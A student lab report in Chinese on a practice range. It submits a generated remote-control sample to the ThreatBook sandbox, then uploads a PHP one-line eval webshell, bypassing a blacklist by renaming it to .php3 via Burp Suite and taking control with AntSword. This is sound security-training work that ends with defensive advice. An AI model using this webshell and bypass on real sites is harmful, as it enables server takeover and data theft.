# Lab-7
实现远程控制实验
被控端沙箱分析 + 文件上传一句话木马蚁剑连接）

实验目的

1.掌握恶意样本沙箱分析方法，将生成的被控端程序上传至微步云沙箱，观察恶意程序动态行为，留存关键截图。

2.掌握文件上传漏洞原理，构造 PHP 一句话木马，使用 Burp Suite 抓包改后缀绕过黑名单过滤，利用蚁剑连接 WebShell，实现对靶场网站控制。

实验环境

靶场：文件上传漏洞靶场（黑名单过滤，拦截 php 后缀，但是放行 php3 后缀）

工具：Burp Suite、蚁剑、微步云沙箱

沙箱地址：https://s.threatbook.com/检测

靶机：window11，（已提前关闭病毒检测和防火墙）

实验原理

1. 微步云沙箱
  沙箱提供隔离虚拟环境，对可执行文件进行动态运行分析，监控样本的进程创建、文件读写、网络请求等行为，自动判定威胁等级，输出检测报告。
2. 文件上传 & 一句话木马
  一句话木马代码：<?php @eval($_POST['cmd']);?>，接收 POST 传入的 cmd 参数并执行 PHP 代码。 本次靶场采用黑名单校验，仅禁止.php后缀上传，没有拦截.php3；老旧 PHP 环境可识别并解析.php3当作 PHP 脚本执行。 Burp Suite 抓取上传数据包，修改文件名后缀实现绕过；蚁剑是 webshell 管理工具，连接木马后可浏览、读写服务器文件，获取网站权限。

实验步骤
实验一：被控端提交微步云沙箱

1.Kali靶机上生成被控端

<img width="668" height="205" alt="屏幕截图 2026-11-06 220247" src="https://github.com/user-attachments/assets/1035518f-a310-4e11-a262-435c2feffefc" />


2.打开微步云沙箱网页：https://s.threatbook.com/检测

<img width="677" height="441" alt="屏幕截图 2026-11-06 222243" src="https://github.com/user-attachments/assets/9fd08516-dfbe-4a5d-b3e7-c20a5b46b963" />


3.等待沙箱完成动态分析，查看报告内威胁判定、进程行为、文件行为、网络行为信息。
<img width="677" height="382" alt="屏幕截图 2026-11-06 222724" src="https://github.com/user-attachments/assets/cac21b54-b353-46ad-9a72-9fc83da0c089" />


实验二：一句话木马上传 + 蚁剑连接控制网站

1.靶机上生成一句话木马文件


<img width="438" height="175" alt="屏幕截图 2026-11-07 214332" src="https://github.com/user-attachments/assets/68631362-2821-44cf-b380-48c20469e367" />



2.访问靶场文件上传页面，直接上传 shell.php 一句话木马，被后端拦截，提示不允许上传 PHP 文件。
<img width="1096" height="573" alt="屏幕截图 2026-11-07 213526" src="https://github.com/user-attachments/assets/9a29af79-708c-452b-8da2-b9407113e4db" />




3.提前配置让浏览器通过Burp Suite 代理，确保流量经过Burp Suite ，并开启 Burp Suite 拦截代理，点击上传，捕获上传 POST 数据包，发送到 Repeater。


<img width="1016" height="419" alt="屏幕截图 2026-11-07 213553" src="https://github.com/user-attachments/assets/0436e7f7-0747-4dd2-b3cb-de66729b5a25" />



4.修改数据包内文件名称，将shell.php改为shell.php3，发送请求。




<img width="938" height="518" alt="屏幕截图 2026-11-07 214236" src="https://github.com/user-attachments/assets/c2d6f347-64cf-49d2-86b4-4f1b096d1695" />


5.页面返回上传成功，文件路径为uploads/shell.php3。

6.打开蚁剑，右键添加数据：输入靶场URL和一句话木马准备的密码



<img width="771" height="487" alt="屏幕截图 2026-11-07 214225" src="https://github.com/user-attachments/assets/b63e64ca-e18f-480f-92dc-6add3d18fc34" />



7.点击测试连接，连接成功后进入服务器文件管理界面，浏览、读取网站服务器文件，实现网站控制。



<img width="847" height="455" alt="屏幕截图 2026-11-07 214551" src="https://github.com/user-attachments/assets/b06ba6eb-7dee-4ad2-9cdf-fa00b0c36c3f" />


实验结果
1.微步云沙箱：成功对被控端样本进行动态分析，沙箱识别样本恶意行为，生成完整威胁检测报告，截图保存。

2.文件上传漏洞实验：成功利用靶场黑名单过滤缺陷，利用Burp Suite修改后缀.php3绕过上传限制，上传一句话木马；蚁剑成功连接 WebShell，获取网站文件读写权限，可访问服务器内文件。
实验总结

1.微步沙箱可以在隔离环境安全分析恶意程序，不用在本机直接运行恶意样本，直观查看恶意程序行为特征。

2.文件上传黑名单校验不安全，攻击者可更换后缀名（php3、php5 等）绕过检测，上传 webshell 获取网站控制权。网站防护应采用白名单校验，同时校验文件内容，仅允许合法文件上传，防止恶意脚本上传。











